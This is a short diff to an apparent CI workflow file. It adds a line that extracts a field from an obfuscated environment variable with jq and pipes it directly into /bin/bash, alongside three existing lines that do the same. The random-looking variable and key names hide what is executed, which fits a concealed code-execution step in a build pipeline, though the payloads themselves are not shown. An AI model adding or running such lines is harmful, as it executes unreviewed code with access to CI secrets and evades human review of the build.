@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$cxe80195" | jq -r .amdu4 | /bin/bash
           echo $zpza0278 | jq -r .vntsk577 | /bin/bash
           echo $tst897 | jq -r .jo4111 | /bin/bash
+          printf '%s' "$zatnp3780" | jq -r .fms36620 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
